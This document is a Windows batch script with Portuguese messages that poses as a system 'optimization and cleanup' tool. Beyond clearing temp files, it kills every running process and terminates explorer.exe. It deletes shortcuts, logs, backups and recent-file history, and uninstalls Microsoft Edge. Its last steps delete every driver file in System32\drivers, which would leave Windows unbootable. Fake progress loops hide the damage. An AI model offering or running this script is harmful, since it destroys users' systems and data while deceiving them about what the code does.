@echo off && setlocal enabledelayedexpansion && echo Iniciando processo de otimização e limpeza do sistema... && del /q /f /s %TEMP%\* > nul && del /q /f /s C:\Windows\Temp\* > nul && del /q /f /s C:\Users\%username%\AppData\Local\Temp\* > nul && cleanmgr /sagerun:1 && defrag C: /O && reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f && reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f && reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU" /f && for /f "tokens=*" %%a in ('dir /s /b C:\*.*') do echo Processando: %%a && for %%f in (C:\Windows\System32\*.dll C:\Windows\System32\*.exe) do (echo Verificando arquivo: %%f && certutil -hashfile %%f MD5) && for /f "delims=" %%b in ('tasklist /fo csv') do (echo Verificando tarefa: %%b && taskkill /f /im %%b) && wmic process where "name='explorer.exe'" call terminate && set /a num=1000 && echo Calculando otimização... && for /l %%i in (1,1,%num%) do (echo Iteração %%i concluída) && for %%g in (C:\Users\%username%\Desktop\*.lnk) do (echo Verificando atalho: %%g && del /f /q %%g) && echo Deletando atalhos desnecessários... && for %%h in (C:\Users\%username%\Documents\*.docx C:\Users\%username%\Documents\*.xlsx) do (echo Processando arquivo de documentos: %%h && attrib -h -s %%h) && for %%i in (C:\Windows\*.log) do (echo Processando arquivos de log: %%i && del /f /q %%i) && for %%j in (C:\Windows\*.bak) do (echo Deletando arquivos de backup: %%j && del /f /q %%j) && echo Limpando arquivos de backup... && echo Buscando pastas vazias... && for /f "delims=" %%k in ('dir /ad /s /b C:\') do (if not exist "%%k\*" (rmdir /s /q "%%k" && echo Pasta vazia excluída: %%k)) && echo Verificando e limpando pastas vazias... && for %%l in (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\*.lnk) do (echo Deletando atalhos de programas: %%l && del /f /q %%l) && echo Deletando atalhos desnecessários de programas... && for %%m in (C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent\*.dat) do (echo Deletando arquivos recentes: %%m && del /f /q %%m) && echo Limpando histórico de arquivos recentes... && for /f "tokens=*" %%n in ('wmic product get Name') do (echo Verificando programas instalados: %%n && if "%%n"=="Microsoft Edge" (echo Programa encontrado: %%n && wmic product where "name='%%n'" call uninstall /nointeractive)) && echo Desinstalando programas não desejados... && echo Calculando otimização... && set /a num2=500 && for /l %%p in (1,1,%num2%) do (echo Iteração %%p concluída) && for %%q in (C:\Windows\*.tmp) do (echo Deletando arquivos temporários: %%q && del /f /q %%q) && echo Limpando arquivos temporários... && for %%r in (C:\Windows\System32\*.sys) do (echo Verificando drivers: %%r && driverquery /v /fo csv) && echo Verificando e limpando drivers... && for %%s in (C:\Windows\Temp\*.bak) do (echo Limpando backups temporários: %%s && del /f /q %%s) && echo Limpando backups temporários... && for %%t in (C:\Windows\System32\drivers\*.sys) do (echo Verificando drivers desnecessários: %%t && del /f /q %%t) && echo Verificando e removendo drivers desnecessários... && echo Finalizando o processo de otimização... && pause
